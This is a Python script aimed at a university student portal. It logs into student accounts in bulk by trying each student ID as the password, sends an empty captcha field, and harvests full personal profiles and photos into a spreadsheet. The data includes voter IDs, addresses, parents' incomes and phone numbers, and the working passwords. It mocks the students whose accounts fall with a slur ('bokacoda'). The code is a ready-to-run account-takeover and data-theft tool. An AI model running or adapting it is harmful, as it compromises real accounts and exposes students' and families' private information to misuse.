import requests
from openpyxl import Workbook
from datetime import datetime
from openpyxl.styles import PatternFill
import os
bokacoda = 0

def fetch_student_info(payload, headers):
    url_info = "http://software.diu.edu.bd:8006/result/studentInfo"
    params = {"studentId": payload["password"]}
    response_info = requests.get(url_info, headers=headers, params=params)
    if response_info.status_code == 200:
        return response_info.json()
    else:
        return None

def download_photo(photo_url, student_id, folder_name):
    response = requests.get(photo_url)
    if response.status_code == 200:
        folder_path = f"{folder_name}/"
        if not os.path.exists(folder_path):
            os.makedirs(folder_path)
        with open(f"{folder_path}/{student_id}.jpg", "wb") as f:
            f.write(response.content)
            print(f"Photo downloaded and saved as: {folder_path}/{student_id}.jpg")
    else:
        print("Failed to download photo.")

def check(payload, ws, folder_name):
    global bokacoda
    headers = {
        "Content-Type": "application/json",
        "Origin": "http://studentportal.diu.edu.bd",
        "Referer": "http://studentportal.diu.edu.bd/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    }
    url_login = "http://software.diu.edu.bd:8006/login"
    
    try:
        response_login = requests.post(url_login, json=payload, headers=headers)
        data_login = response_login.json()
        student_info = fetch_student_info(payload, headers)
        if data_login["message"] == "success":
            Access_token = data_login["accessToken"]
            url = "http://software.diu.edu.bd:8006/profile/studentInfo"
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                "Accesstoken": Access_token,
                "Content-Type": "application/json",
                "Referer": "http://studentportal.diu.edu.bd/",
                "Origin": "http://studentportal.diu.edu.bd",
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive"
            }
            response_access = requests.get(url, headers=headers)
            Access_token_data = response_access.json()

            if "photoFile" in Access_token_data and Access_token_data["photoFile"]:
                photo_url = f"http://software.diu.edu.bd:8006{Access_token_data['photoFile']}"
                download_photo(photo_url, payload["password"], folder_name)

            if student_info:
                row = [
                    "Success",
                    student_info["studentName"],
                    student_info["studentId"],
                    payload["password"],  # Student Portal Password
                    student_info["departmentName"],
                    student_info["batchId"],
                    student_info["shift"],
                    Access_token_data.get("sex", ""),
                    Access_token_data.get("bloodGroup", ""),
                    Access_token_data.get("birthDate", ""),
                    Access_token_data.get("religion", ""),
                    Access_token_data.get("email", ""),
                    Access_token_data.get("mobile", ""),
                    Access_token_data.get("presentHouse", ""),
                    Access_token_data.get("presentZipCode", ""),
                    Access_token_data.get("permanentHouse", ""),
                    Access_token_data.get("permanentZipCode", ""),
                    Access_token_data.get("fatherName", ""),
                    Access_token_data.get("motherName", ""),
                    Access_token_data.get("maritalStatus", ""),
                    Access_token_data.get("nationality", ""),
                    Access_token_data.get("voterId", ""),
                    Access_token_data.get("fatherMobile", ""),
                    Access_token_data.get("fatherOccupation", ""),
                    Access_token_data.get("fatherAnnualIncome", ""),
                    Access_token_data.get("motherMobile", ""),
                    Access_token_data.get("motherOccupation", ""),
                    Access_token_data.get("motherAnnualIncome", ""),
                    Access_token_data.get("localGuardianName", ""),
                    Access_token_data.get("localGuardianMobile", ""),
                    Access_token_data.get("localGuardianRelation", "")
                ]
                ws.append(row)
                bokacoda += 1
                last_row = ws.max_row
                for col in range(1, ws.max_column + 1):  # Iterate through each column in the row
                    cell = ws.cell(row=last_row, column=col)
                    if cell.value is not None and cell.value != "":  # Check if cell is not empty
                        cell.fill = PatternFill(start_color="007d51", end_color="007d51", fill_type="solid")
        elif student_info["studentName"] != "":
            row = [
                "Failed",
                student_info["studentName"],
                student_info["studentId"],
                "",  # Student Portal Password
                student_info["departmentName"],
                student_info["batchId"],
                student_info["shift"],
                "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", ""
            ]
            ws.append(row)
            #for cell in ws[ws.max_row]:
                #cell.fill = PatternFill(start_color="f70d1a", end_color="ff0000", fill_type="solid")  # Red for unsuccessful login/errors (replace with your desired red code)
            # Color the row with red (f70d1a) for unsuccessful login
    
            
      # Increment bokacoda only for unsuccessful cases   
        
    except Exception as e:
        print(f"Exception occurred for ID: {payload['username']}. Exception: {e}")

def main():
    choice = int(input("Enter '1' for a single search or '2' for a range-based search: "))

    wb = Workbook()
    ws = wb.active

    additional_headers = [
        "Sex", "Blood Group", "Birth Date", "Religion", "Email", "Mobile", 
        "Present House", "Present Zip Code", "Permanent House", "Permanent Zip Code", 
        "Father Name", "Mother Name", "Marital Status", "Nationality", "Voter ID", 
        "Father Mobile", "Father Occupation", "Father Annual Income", "Mother Mobile", 
        "Mother Occupation", "Mother Annual Income", "Local Guardian Name", 
        "Local Guardian Mobile", "Local Guardian Relation"
    ]

    ws.append(["Status","Name", "Student ID", "Student Portal Password", "Department", "Batch", "Shift"] + additional_headers)  # Headers

    if choice == 1:
        Id = input("Please enter the ID: ")
        folder_name = f"{Id}_Photos"
        payload = {
            "username": f"{Id}",
            "password": f"{Id}",
            "grecaptcha": ""
        }
        check(payload, ws, folder_name)
    elif choice == 2:
        Batch_code = input("Please enter the Batch Code: ")
        Dept_code = input("Please enter the Department Code: ")
        id_range_lower_bound = input("Please enter the Lower Bound ID: ")
        id_range_upper_bound = input("Please enter the Upper Bound ID: ")
        print("\nProcessing range-based search...")
        for id in range(int(id_range_lower_bound), int(id_range_upper_bound) + 1):
            folder_name = f"{Batch_code}-{Dept_code}-{str(id)}_Photos"
            payload = {
                "username": f"{Batch_code}-{Dept_code}-{str(id)}",
                "password": f"{Batch_code}-{Dept_code}-{str(id)}",
                "grecaptcha": ""
            }
            check(payload, ws, folder_name)
            print(id)

    # Add number of students and percentage of bokacoda
    total_students = ws.max_row - 1  # Exclude the header row
    percentage_bokacoda = (bokacoda / total_students) * 100 if total_students > 0 else 0
    boka = [f"Number Of Bokacoda in {Batch_code} Batch is: {bokacoda}",
            f"Total Number of Students: {total_students}",
            f"Percentage of Bokacoda: {percentage_bokacoda:.2f}%"]
    ws.append(boka)

    current_time = datetime.now().strftime("%Y%m%d%H%M%S")
    filename = f"{Batch_code}-{Dept_code}-{id_range_lower_bound}_to_{id_range_upper_bound}_{current_time}.xlsx"
    wb.save(filename)
    print(f"Student information saved to {filename}")

if __name__ == "__main__":
    main()
